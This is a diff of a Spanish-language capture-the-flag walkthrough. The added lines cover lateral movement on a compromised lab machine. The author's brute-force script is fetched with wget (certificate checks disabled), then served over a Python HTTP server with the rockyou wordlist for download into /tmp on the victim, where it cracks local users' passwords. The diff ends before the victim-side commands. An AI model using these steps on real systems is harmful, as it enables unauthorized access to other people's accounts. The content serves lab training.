@@ -75,9 +75,19 @@ Y finalmente tendremos acceso a la máquina.
 
 ## Paso N6: Cambiando de usuarios
 Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que tendremos que buscar acceder a uno de ellos. Obviaremos las técnicas usuales de búsqueda de credenciales ya que ninguna se aplica en esta máquina.
+<img width="485" height="150" alt="image" src="https://github.com/user-attachments/assets/5a23eb8f-6567-4cd0-93db-daf154f8bf49" />
 
 Para poder acceder a uno de los usuarios, tendremos que hacer fuerza bruta mediante algún script/programa externo, ya que no estamos en un servidor ssh o ftp.
 
-Utilizaremos una herramienta creada por mi llamada [Kaite Force](https://github.com/kaiteMuak/KaiteForce)
+Utilizaremos una herramienta creada por mi llamada [KaiteForce](https://github.com/kaiteMuak/KaiteForce) la cual nos permitirá hacer fuerza bruta en local, la descargaremos de la siguiente forma:
+```
+wget --no-check-certificate -q 'https://raw.githubusercontent.com/kaiteMuak/KaiteForce/refs/heads/main/kforce.sh'
+```
+Luego, abriremos un servidor python en la ruta donde tenemos [KaiteForce](https://github.com/kaiteMuak/KaiteForce) descargada (importante tener ```rockyou.txt``` o cualquier otra wordlist en la misma ruta)
+```
+python3 -m http.server 8000
+```
+y en la máquina victima descargaremos los archivos necesarios en ```/tmp/``` (ya que es una carpeta donde tenemos permisos) dela siguiente manera:
+
 
 
